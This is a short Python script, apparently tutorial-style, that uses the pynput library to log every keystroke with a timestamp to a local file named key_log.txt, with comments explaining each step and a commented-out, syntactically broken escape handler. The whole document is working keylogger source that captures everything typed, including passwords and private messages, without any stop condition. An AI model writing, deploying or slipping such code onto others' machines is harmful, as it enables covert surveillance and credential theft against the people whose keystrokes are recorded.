import logging
from pynput.keyboard import Key, Listener

log_dir=""
'''
Passing an empty string; by default local directory as this python file default local directory as this python file location
'''
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:') 
'''
log_dir is the directory and it stores key_log.txt where we store time ascending keystrokes. Now we define the keystroke functions
'''
def on_press(key):
    logging.info(str(key))
    #if key = Key.esc:
        #return false
    
with Listener(on_press=on_press) as listener:
    listener.join()








